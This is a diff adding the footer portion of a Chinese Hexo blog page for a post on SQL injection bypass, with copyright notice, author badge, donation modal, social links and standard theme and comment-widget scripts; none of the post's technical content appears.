+      <a href="http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="三十，SQL注入绕过" target="_blank" rel="external">http://example.com/2023/12/28/三十，SQL注入绕过/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/baiQstar" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/baiQstar" target="_blank"><span class="text-dark">白易安</span><small class="ml-1x">往事如叶，飘散随风</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/" title="二十九，SQL注入"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
